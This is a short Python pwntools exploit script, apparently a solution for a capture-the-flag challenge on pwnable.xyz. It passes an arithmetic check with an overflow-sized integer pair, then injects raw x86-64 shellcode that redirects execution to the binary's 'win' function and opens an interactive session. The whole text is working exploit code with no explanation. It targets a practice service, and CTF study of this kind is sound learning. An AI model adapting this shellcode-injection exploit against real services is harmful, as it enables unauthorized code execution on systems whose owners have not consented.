#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30028)
elf = ELF("./challenge")
win = elf.symbols['win']


p.recvuntil("= ")
pow = int(p.recv(10), 16)
log.info("pow : "+hex(pow))

x = 2147483648
y = pow - x

p.sendlineafter("> ", str(x) + " " + str(y))

shellcode = "\x58"
shellcode += "\x48\x2d\xce\x02\x00\x00"
#shellcode += "\xff\xd0"
shellcode += "\x50"
shellcode += "\xc3"

#gdb.attach(p)

p.sendlineafter("Input: ", '\x00\x02' + shellcode)

p.interactive()
